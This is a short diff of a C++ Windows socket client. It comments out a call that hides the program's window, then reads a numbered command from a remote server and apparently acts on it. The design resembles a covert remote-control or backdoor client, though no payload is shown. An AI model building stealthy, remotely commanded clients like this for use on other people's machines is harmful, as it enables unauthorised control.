@@ -73,14 +73,15 @@ void closeClient() {
 
 void main() {
 	HWND hWnd = GetForegroundWindow();
-	ShowWindow(hWnd, SW_HIDE);
+	//ShowWindow(hWnd, SW_HIDE);
 	createClient();
 
 	char buf[bufSize];
 	ZeroMemory(buf, bufSize);
 	int bytesReceived = recv(sock, buf, bufSize, 0);
-	cout << "func number " << string(buf, 0, bytesReceived) << endl;
-	int numberFunc = atoi(buf);//todo change func by numb
+	int numberFunc = atoi(buf);
+	cout << "func number " << numberFunc << endl;
+	
 
 	bytesReceived = recv(sock, buf, bufSize, 0);
 	if (bytesReceived > 0)
